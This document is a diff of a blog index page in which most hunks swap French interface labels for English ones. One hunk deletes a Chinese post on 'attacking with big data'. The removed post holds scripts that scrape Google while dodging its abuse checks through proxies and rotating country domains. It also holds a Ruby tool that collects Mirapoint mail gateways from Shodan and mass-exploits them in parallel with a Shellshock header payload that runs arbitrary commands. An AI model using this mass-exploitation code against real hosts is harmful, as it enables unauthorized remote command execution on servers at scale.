@@ -51,9 +51,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
@@ -114,91 +114,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/01/27/任意文件读取漏洞的利用/" data-id="cjbot7scu000j9w1bv36dqlgh" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-利用大数据进行攻击" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/01/15/利用大数据进行攻击/" class="article-date">
-  <time datetime="2017-01-15T11:14:09.000Z" itemprop="datePublished">2017-01-15</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/01/15/利用大数据进行攻击/">利用大数据进行攻击</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>我们在日常的威胁响应中，常常需要定义当前漏洞的危害程度，通常我们是通过某漏洞应用的使用量来判定。但是使用量怎么判断也没有一个准确的说法，一般来说我们通过构造语法去搜索引擎搜索该应用的搜索结果数，并以此为根据来判断一个漏洞是否严重。</p>
-<p>不仅如此，试想，假如我们手握一个0day或者刚公开的1day漏洞的exp时，如何最大化这个漏洞的价值呢？</p>
-<p>这个时候我们就需要利用该漏洞去批量检测或利用，批量的数据一般来自搜索引擎（Google、Bing、Baidu）、开放的网络信息搜索引擎（FOFA、ZoomEye、Shodan）等。</p>
-<p>下面将就这几个方法一个个分析数据获取和利用方式。</p>
-<h3 id="0x01-利用Google"><a href="#0x01-利用Google" class="headerlink" title="0x01 利用Google"></a>0x01 利用Google</h3><p>如果我们能够掌握一个应用的具体搜索语法，则可以利用该语法去搜索引擎中批量检索匹配的应用，再从中提取出URL，放入扫描器里批量扫描，检测是否存在漏洞：</p>
-<p><img src="/upload_image/Dashuju-1.jpg" alt=""></p>
-<p>但是搜索引擎也有其缺点，当我们的扫描器批量检索时，可能会触发恶意搜索检查。比如Google会对同一IP的批量搜索报警，报警后必须通过验证码验证才能继续搜索：</p>
-<p><img src="/upload_image/Dashuju-2.jpg" alt=""></p>
-<p>因此想要批量利用搜索引擎，只有先想办法逃避搜索引擎的恶意搜索检查。在Google里，我能想到的绕过方法有两个：</p>
-<ol>
-<li>利用代理出口，通过更换IP的方式逃避Google的源IP检查</li>
-<li>利用Google众多子域名（.hk .jp .co）分布搜索</li>
-</ol>
-<p>将这两种绕过方式结合之后，我们就可以尝试搜索大一点的数据量了，python实现代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding=gbk</span></div><div class="line"><span class="keyword">from</span> google <span class="keyword">import</span> search</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"></div><div class="line">proxy = urllib2.ProxyHandler(&#123;<span class="string">'http'</span>: <span class="string">'127.0.0.1:8087'</span>&#125;)</div><div class="line">opener = urllib2.build_opener(proxy)</div><div class="line">urllib2.install_opener(opener)</div><div class="line"></div><div class="line">target_lists = []</div><div class="line">google_sites = [<span class="string">'is'</span>, <span class="string">'dk'</span>, <span class="string">'no'</span>, <span class="string">'se'</span>, <span class="string">'fi'</span>, <span class="string">'ee'</span>, <span class="string">'lv'</span>, <span class="string">'lt'</span>, <span class="string">'ie'</span>, <span class="string">'co.uk'</span>, <span class="string">'gg'</span>, <span class="string">'je'</span>, <span class="string">'im'</span>, <span class="string">'fr'</span>, <span class="string">'nl'</span>, <span class="string">'be'</span>, <span class="string">'lu'</span>, <span class="string">'de'</span>, <span class="string">'at'</span>, <span class="string">'ch'</span>, <span class="string">'li  '</span>, <span class="string">'pt'</span>, <span class="string">'es'</span>, <span class="string">'com.gi'</span>, <span class="string">'ad'</span>, <span class="string">'it'</span>, <span class="string">'com.mt'</span>, <span class="string">'sm'</span>, <span class="string">'gr'</span>, <span class="string">'ru'</span>, <span class="string">'com.by'</span>, <span class="string">'com.ua'</span>, <span class="string">'pl'</span>, <span class="string">'cz'</span>, <span class="string">'sk'</span>, <span class="string">'hu'</span>, <span class="string">'si'</span>, <span class="string">'hr'</span>, <span class="string">'ba'</span>, <span class="string">'me'</span>, <span class="string">'rs'</span>, <span class="string">'mk'</span>, <span class="string">'bg'</span>, <span class="string">'ro'</span>, <span class="string">'md'</span>, <span class="string">'com.hk'</span>, <span class="string">'mn'</span>, <span class="string">'co.kr'</span>, <span class="string">'co.jp'</span>, <span class="string">'com.vn'</span>, <span class="string">'la'</span>, <span class="string">'com.kh'</span>, <span class="string">'co.th'</span>, <span class="string">'com.my'</span>, <span class="string">'com.sg'</span>, <span class="string">'com.bn'</span>, <span class="string">'com.ph'</span>, <span class="string">'co.id'</span>, <span class="string">'tp'</span>, <span class="string">'kz'</span>, <span class="string">'kg'</span>, <span class="string">'com.tj'</span>, <span class="string">'co.uz'</span>, <span class="string">'tm'</span>, <span class="string">'com.af'</span>, <span class="string">'com.pk'</span>, <span class="string">'com.np'</span>, <span class="string">'co.in'</span>, <span class="string">'com.bd'</span>, <span class="string">'lk'</span>, <span class="string">'mv'</span>, <span class="string">'com.kw'</span>, <span class="string">'com.sa'</span>, <span class="string">'com.bh'</span>, <span class="string">'ae'</span>, <span class="string">'com.om'</span>, <span class="string">'jo'</span>, <span class="string">'co.il'</span>, <span class="string">'com.lb'</span>, <span class="string">'com.tr'</span>, <span class="string">'az'</span>, <span class="string">'am'</span>, <span class="string">'co.ls'</span>, <span class="string">'com.eg'</span>, <span class="string">'com.ly'</span>, <span class="string">'dz'</span>, <span class="string">'co.ma'</span>, <span class="string">'sn'</span>, <span class="string">'gm'</span>, <span class="string">'ml'</span>, <span class="string">'bf'</span>, <span class="string">'com.sl'</span>, <span class="string">'ci'</span>, <span class="string">'com.gh'</span>, <span class="string">'tg'</span>, <span class="string">'bj'</span>, <span class="string">'ne'</span>, <span class="string">'com.ng'</span>, <span class="string">'sh'</span>, <span class="string">'cm'</span>, <span class="string">'td'</span>, <span class="string">'cf'</span>, <span class="string">'ga'</span>, <span class="string">'cg'</span>, <span class="string">'cd'</span>, <span class="string">'it.ao'</span>, <span class="string">'com.et'</span>, <span class="string">'dj'</span>, <span class="string">'co.ke'</span>, <span class="string">'co.ug'</span>, <span class="string">'co.tz'</span>, <span class="string">'rw'</span>, <span class="string">'bi'</span>, <span class="string">'mw'</span>, <span class="string">'co.mz'</span>, <span class="string">'mg'</span>, <span class="string">'sc'</span>, <span class="string">'mu'</span>, <span class="string">'co.zm'</span>, <span class="string">'co.zw'</span>, <span class="string">'co.bw'</span>, <span class="string">'com.na'</span>, <span class="string">'co.za'</span>, <span class="string">'com.au'</span>, <span class="string">'com.nf'</span>, <span class="string">'co.nz'</span>, <span class="string">'com.sb'</span>, <span class="string">'com.fj'</span>, <span class="string">'fm'</span>, <span class="string">'ki'</span>, <span class="string">'nr'</span>, <span class="string">'tk'</span>, <span class="string">'ws'</span>, <span class="string">'as'</span>, <span class="string">'to'</span>, <span class="string">'nu'</span>, <span class="string">'co.ck'</span>, <span class="string">'com.do'</span>, <span class="string">'tt'</span>, <span class="string">'com.co'</span>, <span class="string">'com.ec'</span>, <span class="string">'co.ve'</span>, <span class="string">'gy'</span>, <span class="string">'com.pe'</span>, <span class="string">'com.bo'</span>, <span class="string">'com.py'</span>, <span class="string">'com.br'</span>, <span class="string">'com.uy'</span>, <span class="string">'com.ar'</span>, <span class="string">'cl'</span>, <span class="string">'gl'</span>, <span class="string">'ca'</span>, <span class="string">'com'</span>, <span class="string">'com.mx'</span>, <span class="string">'com.gt'</span>, <span class="string">'com.bz'</span>, <span class="string">'com.sv'</span>, <span class="string">'hn'</span>, <span class="string">'com.ni'</span>, <span class="string">'co.cr'</span>, <span class="string">'com.pa'</span>, <span class="string">'bs'</span>, <span class="string">'com.cu'</span>, <span class="string">'com.jm'</span>, <span class="string">'ht'</span>]</div><div class="line"></div><div class="line">targets = open(<span class="string">'lists'</span>, <span class="string">'r'</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> targets:</div><div class="line">        query = <span class="string">'intitle:皇冠国际 AND site:%s'</span> % line</div><div class="line"></div><div class="line">        site = google_sites[random.randint(<span class="number">0</span>, len(google_sites) - <span class="number">1</span>)]</div><div class="line"></div><div class="line">        <span class="keyword">print</span> <span class="string">"[*] Using google.%s and checking %s"</span> % (site, line)</div><div class="line"></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">for</span> url <span class="keyword">in</span> search(query, site, stop = <span class="number">1</span>):</div><div class="line">                        <span class="keyword">print</span> <span class="string">"[+] hacked: %s"</span> % url</div><div class="line"></div><div class="line">        <span class="keyword">except</span>:</div><div class="line">                <span class="keyword">pass</span></div></pre></td></tr></table></figure>
-<p>ruby：</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Google</span></span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(query, proxy = <span class="literal">nil</span>)</span></span></div><div class="line">        @query = query</div><div class="line">        @proxy = proxy</div><div class="line">        @sites = [<span class="string">'is'</span>, <span class="string">'dk'</span>, <span class="string">'no'</span>, <span class="string">'se'</span>, <span class="string">'fi'</span>, <span class="string">'ee'</span>, <span class="string">'lv'</span>, <span class="string">'lt'</span>, <span class="string">'ie'</span>, <span class="string">'co.uk'</span>, <span class="string">'gg'</span>, <span class="string">'je'</span>, <span class="string">'im'</span>, <span class="string">'fr'</span>, <span class="string">'nl'</span>, <span class="string">'be'</span>, <span class="string">'lu'</span>, <span class="string">'de'</span>, <span class="string">'at'</span>, <span class="string">'ch'</span>, <span class="string">'li  '</span>, <span class="string">'pt'</span>, <span class="string">'es'</span>, <span class="string">'com.gi'</span>, <span class="string">'ad'</span>, <span class="string">'it'</span>, <span class="string">'com.mt'</span>, <span class="string">'sm'</span>, <span class="string">'gr'</span>, <span class="string">'ru'</span>, <span class="string">'com.by'</span>, <span class="string">'com.ua'</span>, <span class="string">'pl'</span>, <span class="string">'cz'</span>, <span class="string">'sk'</span>, <span class="string">'hu'</span>, <span class="string">'si'</span>, <span class="string">'hr'</span>, <span class="string">'ba'</span>, <span class="string">'me'</span>, <span class="string">'rs'</span>, <span class="string">'mk'</span>, <span class="string">'bg'</span>, <span class="string">'ro'</span>, <span class="string">'md'</span>, <span class="string">'com.hk'</span>, <span class="string">'mn'</span>, <span class="string">'co.kr'</span>, <span class="string">'co.jp'</span>, <span class="string">'com.vn'</span>, <span class="string">'la'</span>, <span class="string">'com.kh'</span>, <span class="string">'co.th'</span>, <span class="string">'com.my'</span>, <span class="string">'com.sg'</span>, <span class="string">'com.bn'</span>, <span class="string">'com.ph'</span>, <span class="string">'co.id'</span>, <span class="string">'tp'</span>, <span class="string">'kz'</span>, <span class="string">'kg'</span>, <span class="string">'com.tj'</span>, <span class="string">'co.uz'</span>, <span class="string">'tm'</span>, <span class="string">'com.af'</span>, <span class="string">'com.pk'</span>, <span class="string">'com.np'</span>, <span class="string">'co.in'</span>, <span class="string">'com.bd'</span>, <span class="string">'lk'</span>, <span class="string">'mv'</span>, <span class="string">'com.kw'</span>, <span class="string">'com.sa'</span>, <span class="string">'com.bh'</span>, <span class="string">'ae'</span>, <span class="string">'com.om'</span>, <span class="string">'jo'</span>, <span class="string">'co.il'</span>, <span class="string">'com.lb'</span>, <span class="string">'com.tr'</span>, <span class="string">'az'</span>, <span class="string">'am'</span>, <span class="string">'co.ls'</span>, <span class="string">'com.eg'</span>, <span class="string">'com.ly'</span>, <span class="string">'dz'</span>, <span class="string">'co.ma'</span>, <span class="string">'sn'</span>, <span class="string">'gm'</span>, <span class="string">'ml'</span>, <span class="string">'bf'</span>, <span class="string">'com.sl'</span>, <span class="string">'ci'</span>, <span class="string">'com.gh'</span>, <span class="string">'tg'</span>, <span class="string">'bj'</span>, <span class="string">'ne'</span>, <span class="string">'com.ng'</span>, <span class="string">'sh'</span>, <span class="string">'cm'</span>, <span class="string">'td'</span>, <span class="string">'cf'</span>, <span class="string">'ga'</span>, <span class="string">'cg'</span>, <span class="string">'cd'</span>, <span class="string">'it.ao'</span>, <span class="string">'com.et'</span>, <span class="string">'dj'</span>, <span class="string">'co.ke'</span>, <span class="string">'co.ug'</span>, <span class="string">'co.tz'</span>, <span class="string">'rw'</span>, <span class="string">'bi'</span>, <span class="string">'mw'</span>, <span class="string">'co.mz'</span>, <span class="string">'mg'</span>, <span class="string">'sc'</span>, <span class="string">'mu'</span>, <span class="string">'co.zm'</span>, <span class="string">'co.zw'</span>, <span class="string">'co.bw'</span>, <span class="string">'com.na'</span>, <span class="string">'co.za'</span>, <span class="string">'com.au'</span>, <span class="string">'com.nf'</span>, <span class="string">'co.nz'</span>, <span class="string">'com.sb'</span>, <span class="string">'com.fj'</span>, <span class="string">'fm'</span>, <span class="string">'ki'</span>, <span class="string">'nr'</span>, <span class="string">'tk'</span>, <span class="string">'ws'</span>, <span class="string">'as'</span>, <span class="string">'to'</span>, <span class="string">'nu'</span>, <span class="string">'co.ck'</span>, <span class="string">'com.do'</span>, <span class="string">'tt'</span>, <span class="string">'com.co'</span>, <span class="string">'com.ec'</span>, <span class="string">'co.ve'</span>, <span class="string">'gy'</span>, <span class="string">'com.pe'</span>, <span class="string">'com.bo'</span>, <span class="string">'com.py'</span>, <span class="string">'com.br'</span>, <span class="string">'com.uy'</span>, <span class="string">'com.ar'</span>, <span class="string">'cl'</span>, <span class="string">'gl'</span>, <span class="string">'ca'</span>, <span class="string">'com'</span>, <span class="string">'com.mx'</span>, <span class="string">'com.gt'</span>, <span class="string">'com.bz'</span>, <span class="string">'com.sv'</span>, <span class="string">'hn'</span>, <span class="string">'com.ni'</span>, <span class="string">'co.cr'</span>, <span class="string">'com.pa'</span>, <span class="string">'bs'</span>, <span class="string">'com.cu'</span>, <span class="string">'com.jm'</span>, <span class="string">'ht'</span>]</div><div class="line"></div><div class="line">        @result = []</div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(stop = <span class="number">50</span>)</span></span></div><div class="line">        site = <span class="string">"www.google.<span class="subst">#&#123;@sites[rand(@sites.size)]&#125;</span>"</span></div><div class="line">        page_count = <span class="number">50</span> <span class="comment"># per page result counts</span></div><div class="line">        start_index = <span class="number">0</span> <span class="comment"># page count</span></div><div class="line"></div><div class="line">        url = site + <span class="string">"/search?num="</span> + page_count.to_s + <span class="string">"&amp;q="</span> + CGI::escape(@query)</div><div class="line"></div><div class="line">        result_count = <span class="number">0</span></div><div class="line"></div><div class="line">        <span class="keyword">begin</span></div><div class="line">            <span class="keyword">if</span> @proxy.<span class="literal">nil</span>?</div><div class="line">                response = Typhoeus.get(url, <span class="symbol">followlocation:</span> <span class="literal">true</span>, <span class="symbol">cache_ttl:</span> <span class="number">500</span>)</div><div class="line">            <span class="keyword">else</span></div><div class="line">                response = Typhoeus.get(</div><div class="line">                    url,</div><div class="line">                    <span class="symbol">proxy:</span> @proxy,</div><div class="line">                    <span class="symbol">proxytype:</span> <span class="string">"socks5"</span>,</div><div class="line">          <span class="symbol">followlocation:</span> <span class="literal">true</span>,</div><div class="line">          <span class="symbol">cache_ttl:</span> <span class="number">500</span></div><div class="line">                )</div><div class="line">            <span class="keyword">end</span></div><div class="line"></div><div class="line">            @result += parse_result(response.body)</div><div class="line"></div><div class="line">            result_count += page_count</div><div class="line"></div><div class="line">            site = <span class="string">"www.google.<span class="subst">#&#123;@sites[rand(@sites.size)]&#125;</span>"</span></div><div class="line">            page_count = <span class="number">50</span> <span class="comment"># per page result counts</span></div><div class="line">            start_index += result_count <span class="comment"># page count</span></div><div class="line"></div><div class="line">            url = site + <span class="string">"/search?num="</span> + page_count.to_s + <span class="string">"&amp;q="</span> + CGI::escape(@query)</div><div class="line">        <span class="keyword">end</span> <span class="keyword">while</span> result_count &lt; stop.to_i</div><div class="line"></div><div class="line">        @result.uniq!</div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line">    private</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_result</span><span class="params">(body)</span></span></div><div class="line">        html_doc = Nokogiri::HTML(body)</div><div class="line">        urls = []</div><div class="line"></div><div class="line">        html_doc.css(<span class="string">"li[class='g'] h3[class='r'] a"</span>).each <span class="keyword">do</span> <span class="params">|url|</span></div><div class="line">            urls &lt;&lt; url[<span class="string">'href'</span>].match(<span class="regexp">/(https?:\/\/[^\/]*)\//</span>)[<span class="number">1</span>]</div><div class="line">        <span class="keyword">end</span></div><div class="line"></div><div class="line">        urls</div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">puts <span class="string">'[*] Searching Google ...'</span></div><div class="line"></div><div class="line">google = Google.new(<span class="string">'inurl:/cgi-bin/madmin.cgi'</span>, <span class="string">'127.0.0.1:8081'</span>))</div><div class="line">result = google.search(<span class="number">50</span>)</div></pre></td></tr></table></figure>
-<p>这样我们就能够批量从google中获取搜索结果了</p>
-<hr>
-<h2 id="0x02-利用Shodan"><a href="#0x02-利用Shodan" class="headerlink" title="0x02 利用Shodan"></a>0x02 利用Shodan</h2><p><a href="https://www.shodan.io/" target="_blank" rel="external">Shodan</a>（撒旦）可以说是一款“黑暗”谷歌，一刻不停的在寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。每个月Shodan都会在大约5亿个服务器上日夜不停地搜集信息。</p>
-<p><img src="/upload_image/Dashuju-3.jpg" alt=""></p>
-<p>与谷歌不同的是，Shodan不是在网上搜索网址，而是直接进入互联网的背后通道。</p>
-<p>Shodan所搜集到的信息是极其惊人的。凡是链接到互联网的红绿灯、安全摄像头、家庭自动化设备以及加热系统等等都会被轻易的搜索到。</p>
-<p>Shodan的使用者曾发现过一个水上公园的控制系统，一个加油站，甚至一个酒店的葡萄酒冷却器。而网站的研究者也曾使用Shodan定位到了核电站的指挥和控制系统及一个粒子回旋加速器。</p>
-<p>Shodan真正值得注意的能力就是能找到几乎所有和互联网相关联的东西。而Shodan真正的可怕之处就是这些设备几乎都没有安装安全防御措施，其可以随意进入。</p>
-<p>Shodan的开发者给我们带来大量数据的同时，也提供了友好的接口供我们查询，比如Ruby就有一个gem包名为Shodan，通过这个包，我们可以方便的查询Shodan的数据。</p>
-<p>具体的开发文档可以看<a href="https://developer.shodan.io/" target="_blank" rel="external">这里</a></p>
-<p>这里说一下API，默认用户的API KEY只能有100次查询限制，每次查询最多只能获得100个结果，除非去购买付费计划：</p>
-<p><img src="/upload_image/Dashuju-4.jpg" alt=""></p>
-<p>下面我们同样以mirapoint邮件网关来搜索下：</p>
-<p><img src="/upload_image/Dashuju-5.jpg" alt=""></p>
-<p>Shodan按国家和地区将搜索结果进行分类。</p>
-<p>我们调用接口来试试：</p>
-<p>它的使用方法很简单，首先创建一个<strong>Shodan::Shodan</strong>的实例对象：</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">api = Shodan::Shodan.new(api_key)</div></pre></td></tr></table></figure>
-<p>然后再调用对象的<strong>search</strong>方法进行搜索就可以了：</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">result = api.search(qury)</div></pre></td></tr></table></figure>
-<p>实际测试（使用mirapoint邮件网关的bash漏洞）：</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">'net/http'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'json'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'base64'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'cgi'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'typhoeus'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'shodan'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_targets_from_shodan</span><span class="params">(query=<span class="string">''</span>, key=<span class="string">'XXXXXXXXXXXXXXXXXXX'</span>)</span></span></div><div class="line">  result = []</div><div class="line">  api = Shodan::Shodan.new key</div><div class="line">  search_result = api.search(query)</div><div class="line">  search_result[<span class="string">'matches'</span>].each <span class="keyword">do</span> <span class="params">|host|</span></div><div class="line">    result &lt;&lt; host[<span class="string">'ip_str'</span>]</div><div class="line">  <span class="keyword">end</span></div><div class="line"></div><div class="line">  result</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack_target</span><span class="params">(<span class="symbol">target:</span> <span class="literal">nil</span>, <span class="symbol">cmd:</span> <span class="string">'/usr/bin/id'</span>)</span></span></div><div class="line">  target &lt;&lt; <span class="string">'/cgi-bin/madmin.cgi'</span></div><div class="line">  exp = <span class="string">'() &#123; :; &#125;; echo `echo X-Bash: test`;'</span></div><div class="line">  response = Typhoeus.get(target, <span class="symbol">headers:</span> &#123;<span class="string">'test'</span> =&gt; exp&#125;)</div><div class="line"></div><div class="line">  <span class="keyword">if</span> response.headers.has_key? <span class="string">'X-Bash'</span></div><div class="line">    response = Typhoeus.get(target, <span class="symbol">headers:</span> &#123;<span class="string">'test'</span> =&gt; <span class="string">"() &#123; :; &#125;; echo; echo just4fun; echo `<span class="subst">#&#123;cmd&#125;</span>`; echo nuf4tsuj;"</span>&#125;)</div><div class="line">    result = response.body.scan(<span class="regexp">/just4fun\n(.*)\nnuf4tsuj/m</span>)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> result.is_a? Array</div><div class="line">      result[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span></div><div class="line">      <span class="literal">false</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">else</span></div><div class="line">    <span class="literal">false</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"></div><div class="line">query = <span class="string">'mirapoint'</span></div><div class="line">targets = get_targets_from_shodan(query)</div><div class="line"></div><div class="line">puts <span class="string">"[*] Result total: <span class="subst">#&#123;targets.size&#125;</span>"</span></div><div class="line"></div><div class="line">threads = []</div><div class="line">targets.each <span class="keyword">do</span> <span class="params">|target|</span></div><div class="line">  threads &lt;&lt; Thread.new &#123;</div><div class="line">    result = attack_target(<span class="symbol">target:</span> target)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> result</div><div class="line">      puts <span class="string">"[+] <span class="subst">#&#123;target&#125;</span>"</span></div><div class="line">      puts <span class="string">"[*] <span class="subst">#&#123;result[<span class="number">0</span>]&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  &#125;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">threads.each &#123;<span class="params">|thr|</span> thr.join&#125;</div></pre></td></tr></table></figure>
-<p>结果：</p>
-<p><img src="/upload_image/Dashuju-6.jpg" alt=""></p>
-<hr>
-<h2 id="0x04-总结-amp-amp-展望"><a href="#0x04-总结-amp-amp-展望" class="headerlink" title="0x04 总结 &amp;&amp; 展望"></a>0x04 总结 &amp;&amp; 展望</h2><p>这些利用大数据进行攻击的目的其实有两个：</p>
-<ol>
-<li>检测漏洞修复率</li>
-<li>批量利用漏洞进行攻击</li>
-</ol>
-<p>目前来说，上面这两种方法都不能够获取到万级以上的数据，毕竟数据都是要钱来买的，所以我们才要自己建立一个指纹识别引擎，不管是检测漏洞也好还是利用漏洞也好，没有数据的话什么都不能开展。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/01/15/利用大数据进行攻击/" data-id="cjbot7scr000h9w1baxhtrelo" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2017/01/27/任意文件读取漏洞的利用/" data-id="cjbqlox8p000k4o1bli3xcx7q" class="article-share-link">Share</a>
       
       
     </footer>
@@ -274,7 +190,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/12/23/HTTP-协议/" data-id="cjbot7scc00079w1bv2iu9i91" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/12/23/HTTP-协议/" data-id="cjbqlox7900074o1bu4fwsj0p" class="article-share-link">Share</a>
       
       
     </footer>
@@ -314,7 +230,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/12/04/端口大集合/" data-id="cjbot7scw000m9w1b8z4xv3gr" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/12/04/端口大集合/" data-id="cjbqlox8q000l4o1b0mcn7u44" class="article-share-link">Share</a>
       
       
     </footer>
@@ -378,7 +294,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/11/15/Discuz7-faq-php-Sqli-漏漏洞分析/" data-id="cjbot7scb00069w1b4ivesn47" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/11/15/Discuz7-faq-php-Sqli-漏漏洞分析/" data-id="cjbqlox7700054o1bkuxyw0h3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -468,7 +384,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/11/15/MVEL解析表达式/" data-id="cjbot7scm000c9w1bad890oa0" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/11/15/MVEL解析表达式/" data-id="cjbqlox7k00094o1b1ay0psaa" class="article-share-link">Share</a>
       
       
     </footer>
@@ -521,7 +437,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/10/10/Java反序列化漏洞/" data-id="cjbot7scj00099w1b86r1ywmj" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/10/10/Java反序列化漏洞/" data-id="cjbqlox7o000b4o1b1j1k2ln4" class="article-share-link">Share</a>
       
       
     </footer>
@@ -593,7 +509,7 @@
       
     </div>
     <footer class="article-footer">
